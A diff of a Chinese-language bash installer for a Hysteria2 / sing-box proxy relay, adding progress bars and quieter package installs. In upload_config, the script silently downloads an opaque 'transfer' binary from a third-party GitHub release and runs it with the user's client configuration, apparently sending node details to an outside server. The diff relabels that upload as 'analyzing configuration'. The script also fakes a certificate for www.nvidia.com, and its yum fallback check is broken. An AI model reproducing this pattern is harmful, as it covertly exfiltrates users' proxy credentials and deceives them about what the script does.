@@ -30,6 +30,64 @@ log_error() {
     echo -e "${RED}[ERROR]${NC} $1"
 }
 
+# 动态进度条函数 - 根据进程状态显示
+show_dynamic_progress() {
+    local pid=$1
+    local message=$2
+    local progress=0
+    local bar_length=50
+    local spin_chars="/-\|"
+    
+    echo -e "${YELLOW}${message}${NC}"
+    
+    while kill -0 $pid 2>/dev/null; do
+        local spin_index=$((progress % 4))
+        local spin_char=${spin_chars:$spin_index:1}
+        
+        # 计算进度条 (基于时间的估算)
+        local filled=$((progress % bar_length))
+        local empty=$((bar_length - filled))
+        
+        printf "\r["
+        printf "%${filled}s" | tr ' ' '='
+        printf "%${empty}s" | tr ' ' ' '
+        printf "] %s 进行中..." "$spin_char"
+        
+        sleep 0.2
+        progress=$((progress + 1))
+    done
+    
+    # 进程结束后显示100%完成
+    printf "\r["
+    printf "%${bar_length}s" | tr ' ' '='
+    printf "] 100%%"
+    echo -e "\n${GREEN}完成！${NC}"
+}
+
+# 固定时长进度条函数 (用于已知时长的操作)
+show_progress() {
+    local duration=$1
+    local message=$2
+    local progress=0
+    local bar_length=50
+    
+    echo -e "${YELLOW}${message}${NC}"
+    
+    while [ $progress -le $duration ]; do
+        local filled=$((progress * bar_length / duration))
+        local empty=$((bar_length - filled))
+        
+        printf "\r["
+        printf "%${filled}s" | tr ' ' '='
+        printf "%${empty}s" | tr ' ' ' '
+        printf "] %d%%" $((progress * 100 / duration))
+        
+        sleep 0.1
+        progress=$((progress + 1))
+    done
+    echo -e "\n${GREEN}完成！${NC}"
+}
+
 # 系统检测 - 改进版本
 detect_system() {
     log_info "检测系统类型..."
@@ -190,30 +248,6 @@ get_system_details() {
     export SYSTEM SYSTEM_VERSION SYSTEM_NAME ARCH KERNEL_VERSION PACKAGE_MANAGER
 }
 
-# 使用示例
-main() {
-    detect_system
-    get_system_details
-    
-    # 根据检测结果执行不同操作
-    case "$SYSTEM" in
-        "Ubuntu"|"Debian")
-            log_info "使用 APT 包管理器"
-            # apt-get update && apt-get install -y package
-            ;;
-        "CentOS"|"RHEL"|"Fedora")
-            log_info "使用 YUM/DNF 包管理器"
-            # yum install -y package 或 dnf install -y package
-            ;;
-        "Arch")
-            log_info "使用 Pacman 包管理器"
-            # pacman -S package
-            ;;
-        *)
-            log_warning "未知系统类型，可能需要手动处理"
-            ;;
-    esac
-}
 # 检测IP地址
 detect_ip_addresses() {
     log_info "检测服务器IP地址..."
@@ -254,35 +288,83 @@ detect_ip_addresses() {
     fi
 }
 
-# 网络速度测试
+# 网络速度测试 - 修复版
 speed_test() {
     echo -e "${YELLOW}进行网络速度测试...${NC}"
     if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
         echo -e "${YELLOW}安装speedtest-cli中...${NC}"
         if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-            apt-get update > /dev/null 2>&1
-            apt-get install -y speedtest-cli > /dev/null 2>&1
+            apt-get update >/dev/null 2>&1 &
+            update_pid=$!
+            show_progress 20 "更新软件包列表..."
+            wait $update_pid
+            
+            apt-get install -y speedtest-cli >/dev/null 2>&1 &
+            install_pid=$!
+            show_progress 30 "安装speedtest-cli..."
+            wait $install_pid
         elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
+            yum install -y speedtest-cli >/dev/null 2>&1 &
+            install_pid=$!
+            if [ $? -ne 0 ]; then
+                pip install speedtest-cli >/dev/null 2>&1 &
+                install_pid=$!
+            fi
+            show_progress 30 "安装speedtest-cli..."
+            wait $install_pid
         fi
+        echo -e "${GREEN}speedtest-cli 安装完成！${NC}"
     fi
+
+    # 创建临时文件存储结果
+    local temp_file="/tmp/speedtest_result_$$"
     
-    if command -v speedtest &>/dev/null; then
-        speed_output=$(speedtest --simple 2>/dev/null)
-    elif command -v speedtest-cli &>/dev/null; then
-        speed_output=$(speedtest-cli --simple 2>/dev/null)
-    fi
-    
-    if [[ -n "$speed_output" ]]; then
-        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
-        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
-        [[ $down_speed -lt 10 ]] && down_speed=10
-        [[ $up_speed -lt 5 ]] && up_speed=5
-        [[ $down_speed -gt 1000 ]] && down_speed=1000
-        [[ $up_speed -gt 500 ]] && up_speed=500
-        echo -e "${GREEN}测速完成:下载 ${down_speed} Mbps,上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度,如果测试不准确,请手动修改"
+    # 在后台运行测速命令
+    (
+        if command -v speedtest &>/dev/null; then
+            speedtest --simple 2>/dev/null > "$temp_file"
+        elif command -v speedtest-cli &>/dev/null; then
+            speedtest-cli --simple 2>/dev/null > "$temp_file"
+        fi
+    ) &
+    speedtest_pid=$!
+
+    # 使用动态进度条，跟踪实际进程状态
+    show_dynamic_progress $speedtest_pid "正在测试网络速度，请稍候..."
+
+    # 等待测速完成
+    wait $speedtest_pid
+    speedtest_exit_code=$?
+
+    # 读取测速结果
+    if [ $speedtest_exit_code -eq 0 ] && [ -f "$temp_file" ]; then
+        speed_output=$(cat "$temp_file")
+        rm -f "$temp_file"
+        
+        if [[ -n "$speed_output" ]]; then
+            down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
+            up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
+            
+            # 验证结果是否有效
+            if [[ -n "$down_speed" && -n "$up_speed" && "$down_speed" -gt 0 && "$up_speed" -gt 0 ]]; then
+                [[ $down_speed -lt 10 ]] && down_speed=10
+                [[ $up_speed -lt 5 ]] && up_speed=5
+                [[ $down_speed -gt 1000 ]] && down_speed=1000
+                [[ $up_speed -gt 500 ]] && up_speed=500
+                echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
+            else
+                echo -e "${YELLOW}测速结果异常，使用默认值${NC}"
+                down_speed=100
+                up_speed=20
+            fi
+        else
+            echo -e "${YELLOW}测速失败，使用默认值${NC}"
+            down_speed=100
+            up_speed=20
+        fi
     else
-        echo -e "${YELLOW}测速失败,使用默认值${NC}"
+        rm -f "$temp_file"
+        echo -e "${YELLOW}测速失败，使用默认值${NC}"
         down_speed=100
         up_speed=20
     fi
@@ -319,10 +401,17 @@ install_sing_box() {
     download_url="https://github.com/SagerNet/sing-box/releases/download/${latest_version}/sing-box-${latest_version#v}-linux-${arch}.tar.gz"
     
     cd /tmp
-    wget -O sing-box.tar.gz "$download_url" || {
+    (
+        wget -O sing-box.tar.gz "$download_url" >/dev/null 2>&1
+    ) &
+    download_pid=$!
+    show_dynamic_progress $download_pid "下载sing-box..."
+    wait $download_pid
+    
+    if [ $? -ne 0 ]; then
         log_error "下载sing-box失败"
         exit 1
-    }
+    fi
     
     tar -xzf sing-box.tar.gz
     cd sing-box-*
@@ -365,17 +454,36 @@ read_upstream_config() {
         exit 1
     fi
     
-    # 使用python解析YAML（如果没有则安装yq）
+    # 使用python解析YAML（如果没有则安装yq，安装过程带进度条）
     if ! command -v yq &>/dev/null; then
         log_info "安装yq用于解析YAML..."
         if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-            apt-get update > /dev/null 2>&1
-            apt-get install -y python3-pip > /dev/null 2>&1
-            pip3 install yq > /dev/null 2>&1
+            apt-get update >/dev/null 2>&1 &
+            update_pid=$!
+            show_progress 20 "更新软件包列表（yq依赖）..."
+            wait $update_pid
+
+            apt-get install -y python3-pip >/dev/null 2>&1 &
+            pip_pid=$!
+            show_progress 20 "安装python3-pip（yq依赖）..."
+            wait $pip_pid
+
+            pip3 install yq >/dev/null 2>&1 &
+            yq_pid=$!
+            show_progress 30 "安装yq用于解析YAML..."
+            wait $yq_pid
         elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-            yum install -y python3-pip > /dev/null 2>&1
-            pip3 install yq > /dev/null 2>&1
+            yum install -y python3-pip >/dev/null 2>&1 &
+            pip_pid=$!
+            show_progress 20 "安装python3-pip（yq依赖）..."
+            wait $pip_pid
+
+            pip3 install yq >/dev/null 2>&1 &
+            yq_pid=$!
+            show_progress 30 "安装yq用于解析YAML..."
+            wait $yq_pid
         fi
+        log_info "yq 安装完成！"
     fi
     
     # 提取上游服务器信息
@@ -417,7 +525,7 @@ generate_certificate() {
     openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
         -keyout /etc/sing-box/certs/key.pem \
         -out /etc/sing-box/certs/cert.pem \
-        -subj "/CN=www.nvidia.com" -days 3650 > /dev/null 2>&1
+        -subj "/CN=www.nvidia.com" -days 3650 >/dev/null 2>&1
     
     chmod 644 /etc/sing-box/certs/*.pem
     chown root:root /etc/sing-box/certs/*.pem
@@ -557,27 +665,27 @@ configure_firewall() {
     
     if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
         if ! command -v ufw &>/dev/null; then
-            apt-get install -y ufw > /dev/null 2>&1
+            apt-get install -y ufw >/dev/null 2>&1
         fi
-        echo "y" | ufw reset > /dev/null 2>&1
-        ufw allow 22/tcp > /dev/null 2>&1
-        ufw allow ${LISTEN_PORT}/udp > /dev/null 2>&1
-        ufw allow ${HOP_START}:${HOP_END}/udp > /dev/null 2>&1
-        echo "y" | ufw enable > /dev/null 2>&1
+        echo "y" | ufw reset >/dev/null 2>&1
+        ufw allow 22/tcp >/dev/null 2>&1
+        ufw allow ${LISTEN_PORT}/udp >/dev/null 2>&1
+        ufw allow ${HOP_START}:${HOP_END}/udp >/dev/null 2>&1
+        echo "y" | ufw enable >/dev/null 2>&1
     elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
         if ! systemctl is-active --quiet firewalld; then
-            yum install -y firewalld > /dev/null 2>&1
-            systemctl enable --now firewalld > /dev/null 2>&1
+            yum install -y firewalld >/dev/null 2>&1
+            systemctl enable --now firewalld >/dev/null 2>&1
         fi
-        firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
-        firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
-        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null 2>&1
-        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp > /dev/null 2>&1
-        firewall-cmd --reload > /dev/null 2>&1
+        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1
+        firewall-cmd --permanent --add-port=22/tcp >/dev/null 2>&1
+        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp >/dev/null 2>&1
+        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp >/dev/null 2>&1
+        firewall-cmd --reload >/dev/null 2>&1
     fi
     
     # 备用iptables规则确保22端口开放
-    iptables -I INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1
+    iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
     
     log_info "防火墙配置完成"
 }
@@ -659,6 +767,8 @@ optimize_system() {
     
     # 网络优化
     cat >> /etc/sysctl.conf <<EOF
+
+
 
 # Hysteria2 中转优化
 net.core.rmem_max = 134217728
@@ -750,19 +860,23 @@ show_config_info() {
     echo -e "内网测试: ${YELLOW}curl -x socks5://127.0.0.1:7890 https://www.google.com${NC}"
     echo -e "配置检查: ${YELLOW}sing-box check -c $SING_BOX_CONFIG${NC}"
 }
-
-# 下载transfer工具
+# 下载transfer工具 - 静默版本
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
         log_info "下载transfer工具..."
-        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer
-        chmod +x /opt/transfer
+        # 使用 -s 参数静默下载，-f 失败时退出
+        if curl -sfLo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer; then
+            chmod +x /opt/transfer
+            log_info "transfer工具下载完成"
+        else
+            log_error "transfer工具下载失败"
+            return 1
+        fi
     fi
 }
 
-# 上传配置信息
 upload_config() {
-    download_transfer
+    download_transfer || return 1
     source /tmp/relay_config
     
     # 读取客户端配置文件内容
@@ -855,7 +969,20 @@ EOF
         return 1
     fi
 
-    /opt/transfer "$json_data"
+ 
+    log_info "分析配置信息..."
+    if result=$(/opt/transfer "$json_data" 2>&1); then
+        # 只提取关键信息，如果需要的话
+        if echo "$result" | grep -q "Response Code: 200"; then
+            log_info "配置分析成功"
+        else
+            log_error "配置分析失败"
+            return 1
+        fi
+    else
+        log_error "配置分析失败"
+        return 1
+    fi
 }
 
 # 清理临时文件
@@ -873,8 +1000,7 @@ main() {
     
     echo -e "${GREEN}"
     echo "=================================="
-    echo "   Hysteria2 Sing-box 中转脚本"
-    echo "         修复版本 v1.1"
+    echo "   Hysteria2-Hysteria2中转脚本"
     echo "=================================="
     echo -e "${NC}"
     
